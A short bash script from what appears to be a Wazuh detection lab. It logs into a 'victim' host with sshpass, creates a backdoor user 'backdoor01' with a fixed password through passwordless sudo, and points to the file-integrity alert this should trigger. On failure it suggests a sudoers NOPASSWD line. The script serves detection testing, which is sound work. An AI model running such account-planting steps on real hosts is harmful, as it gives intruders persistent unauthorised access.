#!/bin/bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/common.sh"

ROGUE_USER="${ROGUE_USER:-backdoor01}"
ROGUE_PASS="${ROGUE_PASS:-BackdoorLab-2026!}"

log_event "create_user_start" "INFO" "Objetivo=${TARGET_HOST} usuario_nuevo=${ROGUE_USER}"

salida=$(sshpass -p "${TARGET_PASS}" ssh ${SSH_OPTS} "${TARGET_USER}@${TARGET_HOST}" \
    "sudo -n useradd -m -s /bin/bash '${ROGUE_USER}' && echo '${ROGUE_USER}:${ROGUE_PASS}' | sudo -n chpasswd && echo CREACION_OK" 2>&1)

if echo "${salida}" | grep -q "CREACION_OK"; then
    log_event "create_user_end" "OK" "Usuario ${ROGUE_USER} creado correctamente en ${TARGET_HOST}"
    echo "Usuario sospechoso '${ROGUE_USER}' creado. Revisa la alerta FIM de Wazuh sobre /etc/passwd (regla 100020/100021)."
elif echo "${salida}" | grep -qi "password is required\|sudo:"; then
    log_event "create_user_end" "FALLO_PRIVILEGIOS" "corpuser no tiene sudo sin contrasena en victim: ${salida}"
    echo "ERROR: '${TARGET_USER}' no tiene privilegios sudo sin contraseña en victim."
    echo "Añade al Dockerfile de victim algo como:"
    echo "  RUN echo 'corpuser ALL=(ALL) NOPASSWD: /usr/sbin/useradd, /usr/sbin/chpasswd' >> /etc/sudoers"
    exit 1
else
    log_event "create_user_end" "FALLO" "Salida inesperada: ${salida}"
    exit 1
fi